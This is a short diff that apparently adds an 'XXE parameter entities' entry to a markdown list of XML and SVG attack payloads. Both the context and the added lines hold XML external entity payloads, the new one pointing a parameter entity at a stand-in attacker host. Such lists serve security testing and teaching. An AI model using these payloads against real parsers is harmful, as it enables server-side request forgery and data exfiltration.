@@ -29,3 +29,9 @@ xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
 <text font-size="13" x="28" y="28">&fetch;</text>
 </svg>
 ```
+
+XXE parameter entities
+
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
